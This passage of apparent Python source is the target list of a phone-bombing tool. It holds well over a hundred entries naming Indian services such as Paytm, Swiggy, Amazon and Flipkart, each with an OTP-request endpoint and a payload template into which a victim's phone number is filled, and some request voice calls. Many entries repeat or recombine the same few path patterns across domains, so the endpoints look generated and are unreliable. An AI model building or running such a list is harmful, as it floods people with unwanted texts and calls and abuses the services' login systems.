    {'name': 'Newme Call', 'url': 'https://newme.asia/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Oyorooms Call', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Khatabook Call', 'url': 'https://khatabook.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Amazon SMS', 'url': 'https://amazon.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Cred Call', 'url': 'https://cred.club/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Nykaa Call', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Uber Call', 'url': 'https://uber.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Ajio Call', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
